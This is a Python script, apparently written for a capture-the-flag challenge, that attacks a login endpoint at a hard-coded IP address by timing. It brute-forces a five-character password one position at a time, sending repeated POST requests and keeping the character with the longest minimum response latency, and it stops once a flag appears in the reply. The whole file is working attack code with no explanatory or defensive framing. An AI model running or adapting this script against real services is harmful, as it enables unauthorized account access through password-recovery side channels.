import requests
import time
import string

url = "http://141.85.224.115:7203/"
chars = string.ascii_letters + string.digits
password = ["a"] * 5  # We know it's 5 chars
SAMPLES = 10           # Number of requests per character to beat lag

print(f"Cracking 5-character password at {url}...")

for i in range(5):
    best_char = ""
    max_min_time = 0
    
    print(f"\nTesting position {i+1}...")
    
    for c in chars:
        temp_pass = list(password)
        temp_pass[i] = c
        payload = {"password": "".join(temp_pass)}
        
        # Collect multiple samples to find the "true" minimum latency
        sample_times = []
        for _ in range(SAMPLES):
            start = time.perf_counter()
            try:
                r = requests.post(url, json=payload, timeout=5)
                end = time.perf_counter()
                
                # Check for success immediately
                if "flag" in r.text.lower() or r.status_code == 200 and "Wrong" not in r.text:
                    print(f"\n[!!!] FLAG FOUND: {r.text}")
                    exit()
                    
                sample_times.append(end - start)
            except:
                continue
        
        # We use the MINIMUM time to filter out network spikes
        if sample_times:
            current_min = min(sample_times)
            if current_min > max_min_time:
                max_min_time = current_min
                best_char = c
                
    password[i] = best_char
    print(f"Position {i+1} confirmed: {best_char} | Current: {''.join(password)} | Min Latency: {max_min_time:.4f}s")

print(f"\nFinal Guess: {''.join(password)}")